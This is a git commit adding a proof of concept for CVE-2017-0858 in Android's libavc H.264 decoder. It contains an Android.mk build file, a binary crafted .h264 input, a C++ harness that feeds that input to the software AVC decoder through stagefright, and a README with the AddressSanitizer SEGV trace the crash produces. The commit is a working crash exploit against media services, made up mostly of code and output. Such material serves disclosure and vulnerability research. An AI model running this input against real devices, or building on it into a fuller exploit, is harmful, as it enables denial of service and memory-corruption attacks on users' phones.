ele7enxxh__poc-exp
commit 1171a95714ee4edcb31c285448aad5221aac000c
Author:     ele7enxxh <ele7enxxh@qq.com>
AuthorDate: Sat Dec 30 10:47:08 2017 +0800
Commit:     ele7enxxh <ele7enxxh@qq.com>
CommitDate: Sat Dec 30 10:47:08 2017 +0800

    poc for CVE-2017-0858

diff --git a/CVE-2017-0858/Android.mk b/CVE-2017-0858/Android.mk
new file mode 100644
index 0000000..e39eef4
--- /dev/null
+++ b/CVE-2017-0858/Android.mk
@@ -0,0 +1,20 @@
+LOCAL_PATH:= $(call my-dir)
+include $(CLEAR_VARS)
+
+LOCAL_SRC_FILES:= \
+	mediacodec-decoder.cpp
+
+LOCAL_C_INCLUDES:= \
+  $(TOP)/frameworks/native/include/media/openmax
+
+LOCAL_SHARED_LIBRARIES := \
+	libutils \
+	libstagefright \
+	libstagefright_foundation \
+	liblog \
+	libbinder \
+	libmedia
+
+LOCAL_MODULE:= mediacodec-decoder
+
+include $(BUILD_EXECUTABLE)
diff --git a/CVE-2017-0858/CVE-2017-0858.h264 b/CVE-2017-0858/CVE-2017-0858.h264
new file mode 100644
index 0000000..69b7f30
Binary files /dev/null and b/CVE-2017-0858/CVE-2017-0858.h264 differ
diff --git a/CVE-2017-0858/README.md b/CVE-2017-0858/README.md
new file mode 100644
index 0000000..20cb3fe
--- /dev/null
+++ b/CVE-2017-0858/README.md
@@ -0,0 +1,113 @@
+mediacodec-decoder CVE-2017-0858.h264
+
+```
+08-18 06:15:41.233 23256 11747 I         : =================================================================
+08-18 06:15:41.233 23256 11747 I         : 
+08-18 06:15:41.236 23256 11747 I         : 
+08-18 06:15:41.237 23256 11747 I         : ==23256==ERROR: AddressSanitizer: SEGV on unknown address 0x00000000 (pc 0xf3030a88 bp 0x00000000 sp 0xf26ff6b8 T6)
+08-18 06:15:41.237 23256 11747 I         : 
+08-18 06:15:41.237 23256 11747 I         : 
+08-18 06:15:41.461 23256 11747 I         :     #0 0xf3030a87  /proc/self/cwd/ih264_inter_pred_chroma_a9q.s:142
+08-18 06:15:41.461 23256 11747 I         : 
+08-18 06:15:41.469 23256 11747 I         :     #1 0xf5ee4a93  (/system/lib/libclang_rt.asan-arm-android.so+0x77a93)
+08-18 06:15:41.469 23256 11747 I         : 
+08-18 06:15:41.479 23256 11747 I         :     #2 0xf67840bb  (/data/lib/libc.so+0x170bb)
+08-18 06:15:41.480 23256 11747 I         : 
+08-18 06:15:41.480 23256 11747 I         : 
+08-18 06:15:41.480 23256 11747 I         : 
+08-18 06:15:41.480 23256 11747 I         : AddressSanitizer can not provide additional info.
+08-18 06:15:41.480 23256 11747 I         : 
+08-18 06:15:41.481 23256 11747 I         : SUMMARY: AddressSanitizer: SEGV /proc/self/cwd/ih264_inter_pred_chroma_a9q.s:142 
+08-18 06:15:41.481 23256 11747 I         : 
+08-18 06:15:41.481 23256 11747 I         : Thread T6 created by T2 (le.h264.decoder) here:
+08-18 06:15:41.481 23256 11747 I         : 
+08-18 06:15:41.481 23256 11747 I         :     #0 0xf5ec94db in pthread_create (/system/lib/libclang_rt.asan-arm-android.so+0x5c4db)
+08-18 06:15:41.481 23256 11747 I         : 
+08-18 06:15:41.484 23256 11747 I         :     #1 0xf309ce8f in ih264d_parse_decode_slice /proc/self/cwd/external/libavc/decoder/ih264d_parse_slice.c:1541:17
+08-18 06:15:41.485 23256 11747 I         : 
+08-18 06:15:41.488 23256 11747 I         :     #2 0xf3020e0b in ih264d_video_decode /proc/self/cwd/external/libavc/decoder/ih264d_api.c:2085:15
+08-18 06:15:41.488 23256 11747 I         : 
+08-18 06:15:41.489 23256 11747 I         :     #3 0xf302a4e3 in ih264d_api_function /proc/self/cwd/external/libavc/decoder/ih264d_api.c:3706:26
+08-18 06:15:41.489 23256 11747 I         : 
+08-18 06:15:41.493 23256 11747 I         :     #4 0xf30177df in android::SoftAVC::onQueueFilled(unsigned int) /proc/self/cwd/frameworks/av/media/libstagefright/codecs/avcdec/SoftAVCDec.cpp:629:22
+08-18 06:15:41.493 23256 11747 I         : 
+08-18 06:15:41.496 23256 11747 I         :     #5 0xf68708df in android::SimpleSoftOMXComponent::onMessageReceived(android::sp<android::AMessage> const&) (/data/lib/libstagefright_omx.so+0x518df)
+08-18 06:15:41.496 23256 11747 I         : 
+08-18 06:15:41.497 23256 11747 I         :     #6 0xf687537f  (/data/lib/libstagefright_omx.so+0x5637f)
+08-18 06:15:41.497 23256 11747 I         : 
+08-18 06:15:41.499 23256 11747 I         :     #7 0xf57ddf73 in android::AHandler::deliverMessage(android::sp<android::AMessage> const&) (/data/lib/libstagefright_foundation.so+0x12f73)
+08-18 06:15:41.499 23256 11747 I         : 
+08-18 06:15:41.500 23256 11747 I         :     #8 0xf57ea8a7 in android::AMessage::deliver() (/data/lib/libstagefright_foundation.so+0x1f8a7)
+08-18 06:15:41.500 23256 11747 I         : 
+08-18 06:15:41.500 23256 11747 I         :     #9 0xf57e1853 in android::ALooper::loop() (/data/lib/libstagefright_foundation.so+0x16853)
+08-18 06:15:41.500 23256 11747 I         : 
+08-18 06:15:41.502 23256 11747 I         :     #10 0xf584813f in android::Thread::_threadLoop(void*) (/data/lib/libutils.so+0x1b13f)
+08-18 06:15:41.502 23256 11747 I         : 
+08-18 06:15:41.503 23256 11747 I         :     #11 0xf67b4093 in __pthread_start(void*) (/data/lib/libc.so+0x47093)
+08-18 06:15:41.503 23256 11747 I         : 
+08-18 06:15:41.503 23256 11747 I         : 
+08-18 06:15:41.503 23256 11747 I         : 
+08-18 06:15:41.503 23256 11747 I         : Thread T2 (le.h264.decoder) created by T1 (Binder:23256_1) here:
+08-18 06:15:41.503 23256 11747 I         : 
+08-18 06:15:41.503 23256 11747 I         :     #0 0xf5ec94db in pthread_create (/system/lib/libclang_rt.asan-arm-android.so+0x5c4db)
+08-18 06:15:41.503 23256 11747 I         : 
+08-18 06:15:41.503 23256 11747 I         :     #1 0xf584687f in androidCreateRawThreadEtc (/data/lib/libutils.so+0x1987f)
+08-18 06:15:41.503 23256 11747 I         : 
+08-18 06:15:41.503 23256 11747 I         :     #2 0xf584795b in android::Thread::run(char const*, int, unsigned int) (/data/lib/libutils.so+0x1a95b)
+08-18 06:15:41.503 23256 11747 I         : 
+08-18 06:15:41.504 23256 11747 I         :     #3 0xf57e11f3 in android::ALooper::start(bool, bool, int) (/data/lib/libstagefright_foundation.so+0x161f3)
+08-18 06:15:41.504 23256 11747 I         : 
+08-18 06:15:41.504 23256 11747 I         :     #4 0xf686d1af in android::SimpleSoftOMXComponent::SimpleSoftOMXComponent(char const*, OMX_CALLBACKTYPE const*, void*, OMX_COMPONENTTYPE**) (/data/lib/libstagefright_omx.so+0x4e1af)
+08-18 06:15:41.504 23256 11747 I         : 
+08-18 06:15:41.504 23256 11747 I         :     #5 0xf6877013 in android::SoftVideoDecoderOMXComponent::SoftVideoDecoderOMXComponent(char const*, char const*, OMX_VIDEO_CODINGTYPE, android::CodecProfileLevel const*, unsigned int, int, int, OMX_CALLBACKTYPE const*, void*, OMX_COMPONENTTYPE**) (/data/lib/libstagefright_omx.so+0x58013)
+08-18 06:15:41.504 23256 11747 I         : 
+08-18 06:15:41.506 23256 11747 I         :     #6 0xf301974f in android::SoftAVC::SoftAVC(char const*, OMX_CALLBACKTYPE const*, void*, OMX_COMPONENTTYPE**) /proc/self/cwd/frameworks/av/media/libstagefright/codecs/avcdec/SoftAVCDec.cpp:112:7
+08-18 06:15:41.506 23256 11747 I         : 
+08-18 06:15:41.506 23256 11747 I         :     #7 0xf301974f in createSoftOMXComponent(char const*, OMX_CALLBACKTYPE const*, void*, OMX_COMPONENTTYPE**) /proc/self/cwd/frameworks/av/media/libstagefright/codecs/avcdec/SoftAVCDec.cpp:768
+08-18 06:15:41.506 23256 11747 I         : 
+08-18 06:15:41.506 23256 11747 I         :     #8 0xf68767ff in android::SoftOMXPlugin::makeComponentInstance(char const*, OMX_CALLBACKTYPE const*, void*, OMX_COMPONENTTYPE**) (/data/lib/libstagefright_omx.so+0x577ff)
+08-18 06:15:41.506 23256 11747 I         : 
+08-18 06:15:41.506 23256 11747 I         :     #9 0xf68501f3 in android::OMXMaster::makeComponentInstance(char const*, OMX_CALLBACKTYPE const*, void*, OMX_COMPONENTTYPE**) (/data/lib/libstagefright_omx.so+0x311f3)
+08-18 06:15:41.506 23256 11747 I         : 
+08-18 06:15:41.506 23256 11747 I         :     #10 0xf6845ceb in android::OMX::allocateNode(char const*, android::sp<android::IOMXObserver> const&, android::sp<android::IBinder>*, unsigned int*) (/data/lib/libstagefright_omx.so+0x26ceb)
+08-18 06:15:41.507 23256 11747 I         : 
+08-18 06:15:41.516 23256 11747 I         :     #11 0xf5b095fb in android::BnOMX::onTransact(unsigned int, android::Parcel const&, android::Parcel*, unsigned int) (/data/lib/libmedia.so+0x1485fb)
+08-18 06:15:41.516 23256 11747 I         : 
+08-18 06:15:41.521 23256 11747 I         :     #12 0xf5be1913 in android::BBinder::transact(unsigned int, android::Parcel const&, android::Parcel*, unsigned int) (/data/lib/libbinder.so+0x32913)
+08-18 06:15:41.521 23256 11747 I         : 
+08-18 06:15:41.521 23256 11747 I         :     #13 0xf5c03bcf in android::IPCThreadState::executeCommand(int) (/data/lib/libbinder.so+0x54bcf)
+08-18 06:15:41.521 23256 11747 I         : 
+08-18 06:15:41.521 23256 11747 I         :     #14 0xf5c03107 in android::IPCThreadState::getAndExecuteCommand() (/data/lib/libbinder.so+0x54107)
+08-18 06:15:41.521 23256 11747 I         : 
+08-18 06:15:41.522 23256 11747 I         :     #15 0xf5c0455b in android::IPCThreadState::joinThreadPool(bool) (/data/lib/libbinder.so+0x5555b)
+08-18 06:15:41.522 23256 11747 I         : 
+08-18 06:15:41.522 23256 11747 I         :     #16 0xf5c6869f  (/data/lib/libbinder.so+0xb969f)
+08-18 06:15:41.522 23256 11747 I         : 
+08-18 06:15:41.522 23256 11747 I         :     #17 0xf5847f37 in android::Thread::_threadLoop(void*) (/data/lib/libutils.so+0x1af37)
+08-18 06:15:41.522 23256 11747 I         : 
+08-18 06:15:41.522 23256 11747 I         :     #18 0xf67b4093 in __pthread_start(void*) (/data/lib/libc.so+0x47093)
+08-18 06:15:41.522 23256 11747 I         : 
+08-18 06:15:41.522 23256 11747 I         : 
+08-18 06:15:41.522 23256 11747 I         : 
+08-18 06:15:41.522 23256 11747 I         : Thread T1 (Binder:23256_1) created by T0 here:
+08-18 06:15:41.522 23256 11747 I         : 
+08-18 06:15:41.522 23256 11747 I         :     #0 0xf5ec94db in pthread_create (/system/lib/libclang_rt.asan-arm-android.so+0x5c4db)
+08-18 06:15:41.522 23256 11747 I         : 
+08-18 06:15:41.523 23256 11747 I         :     #1 0xf584687f in androidCreateRawThreadEtc (/data/lib/libutils.so+0x1987f)
+08-18 06:15:41.523 23256 11747 I         : 
+08-18 06:15:41.523 23256 11747 I         :     #2 0xf5847933 in android::Thread::run(char const*, int, unsigned int) (/data/lib/libutils.so+0x1a933)
+08-18 06:15:41.523 23256 11747 I         : 
+08-18 06:15:41.523 23256 11747 I         :     #3 0xf5c66167 in android::ProcessState::spawnPooledThread(bool) (/data/lib/libbinder.so+0xb7167)
+08-18 06:15:41.523 23256 11747 I         : 
+08-18 06:15:41.523 23256 11747 I         :     #4 0xf5c65ef7 in android::ProcessState::startThreadPool() (/data/lib/libbinder.so+0xb6ef7)
+08-18 06:15:41.523 23256 11747 I         : 
+08-18 06:15:41.524 23256 11747 I         :     #5 0xb077214b in __libc_init (/system/bin/mediacodec+0x114b)
+08-18 06:15:41.524 23256 11747 I         : 
+08-18 06:15:41.524 23256 11747 I         :     #6 0xf6783c61 in __libc_init (/data/lib/libc.so+0x16c61)
+08-18 06:15:41.524 23256 11747 I         : 
+08-18 06:15:41.525 23256 11747 I         :     #7 0xffffffff  (<unknown module>)
+08-18 06:15:41.525 23256 11747 I         : 
+08-18 06:15:41.525 23256 11747 I         : 
+08-18 06:15:41.525 23256 11747 I         : 
+08-18 06:15:41.525 23256 11747 I         : ==23256==ABORTING
+```
diff --git a/CVE-2017-0858/mediacodec-decoder b/CVE-2017-0858/mediacodec-decoder
new file mode 100644
index 0000000..8874773
Binary files /dev/null and b/CVE-2017-0858/mediacodec-decoder differ
diff --git a/CVE-2017-0858/mediacodec-decoder.cpp b/CVE-2017-0858/mediacodec-decoder.cpp
new file mode 100644
index 0000000..e31733c
--- /dev/null
+++ b/CVE-2017-0858/mediacodec-decoder.cpp
@@ -0,0 +1,179 @@
+#include <binder/ProcessState.h>
+#include <media/stagefright/MediaBufferGroup.h>
+#include <media/stagefright/MediaDefs.h>
+#include <media/stagefright/MetaData.h>
+#include <media/stagefright/SimpleDecodingSource.h>
+#include <media/stagefright/FileSource.h>
+#include <media/stagefright/MediaSource.h>
+#include <media/stagefright/MediaCodecList.h>
+
+using namespace android;
+
+class MiniSource : public MediaSource {
+public:
+  MiniSource(const sp<FileSource> &fileSource);
+  virtual status_t start(MetaData *params = NULL);
+  virtual status_t stop();
+  virtual sp<MetaData> getFormat();
+  virtual status_t read(MediaBuffer **buffer, const ReadOptions *options = NULL);
+
+protected:
+  virtual ~MiniSource();
+
+private:
+  sp<FileSource> mFileSource;
+  bool mStarted;
+  MediaBufferGroup *mGroup;
+  int64_t mLength;
+  off64_t mCurrentPos;
+};
+
+MiniSource::MiniSource(const sp<FileSource> &fileSource)
+  :mFileSource(fileSource),
+   mStarted(false),
+   mGroup(NULL),
+   mLength(0),
+   mCurrentPos(0)
+{
+}
+
+MiniSource::~MiniSource()
+{
+  if (mStarted) {
+    stop();
+  }
+}
+
+status_t MiniSource::start(MetaData *) {
+    CHECK(!mStarted);
+
+    mFileSource->getSize(&mLength);
+
+    mGroup = new MediaBufferGroup;
+
+    mGroup->add_buffer(new MediaBuffer(mLength));
+
+    mStarted = true;
+
+    return OK;
+}
+
+status_t MiniSource::stop() {
+    CHECK(mStarted);
+
+    delete mGroup;
+    mGroup = NULL;
+
+    mStarted = false;
+
+    return OK;
+}
+
+sp<MetaData> MiniSource::getFormat()
+{
+  sp<MetaData> meta = new MetaData;
+  meta->setCString(kKeyMIMEType, MEDIA_MIMETYPE_VIDEO_AVC);
+  meta->setInt32(kKeyWidth, 176);
+  meta->setInt32(kKeyHeight, 144);
+  return meta;
+}
+
+status_t MiniSource::read(
+  MediaBuffer **out, const ReadOptions *)
+{
+  *out = NULL;
+
+  MediaBuffer *buffer;
+  status_t err = mGroup->acquire_buffer(&buffer);
+  if (err != OK) {
+    return err;
+  }
+
+  CHECK(mLength <= buffer->size());
+
+  ssize_t n = mFileSource->readAt(mCurrentPos, (uint8_t *)buffer->data(), mLength);
+  if (n != mLength) {
+      buffer->release();
+      buffer = NULL;
+
+      return ERROR_END_OF_STREAM;
+  }
+
+  buffer->set_range(0, mLength);
+
+  buffer->meta_data()->setInt64(kKeyTime, 0);
+
+  mCurrentPos += mLength;
+
+  *out = buffer;
+
+  return OK;
+}
+
+void decode(const char *path) {
+    sp<FileSource> fileSource = new FileSource(path);
+    if (fileSource == NULL) {
+        printf("fileSource is NULL\n");
+        return;
+    }
+
+    sp<IMediaSource> mediaSource = new MiniSource(fileSource);
+
+    sp<MediaSource> decoder = SimpleDecodingSource::Create(mediaSource, MediaCodecList::kPreferSoftwareCodecs, NULL);
+    if (decoder == NULL) {
+        printf("decoder is NULL\n");
+        return;
+    }
+
+    status_t err = decoder->start();
+    if (err != (status_t) OK) {
+        printf("decoder start failed\n");
+        return;
+    }
+
+    long numFrames = 0;
+    MediaBuffer *buffer;
+    for (;;) {
+        status_t err = decoder->read(&buffer);
+
+        if (err != OK) {
+            if (err == INFO_FORMAT_CHANGED) {
+                printf("format changed.\n");
+                continue;
+            }
+            break;
+        }
+
+        if (buffer->range_length() > 0) {
+                printf(".");
+                fflush(stdout);
+        }
+
+        buffer->release();
+        buffer = NULL;
+
+        ++numFrames;
+        if (numFrames == 1) {
+            break;
+        }
+    }
+
+    err = decoder->stop();
+    if (err != (status_t) OK) {
+        printf("decoder stop failed\n");
+        return;
+    }
+
+    printf("$\n");
+}
+
+int main(int argc, char **argv)
+{
+    if (argc != 2) {
+        return -1;
+    }
+
+    android::ProcessState::self()->startThreadPool();
+
+    decode(argv[1]);
+}
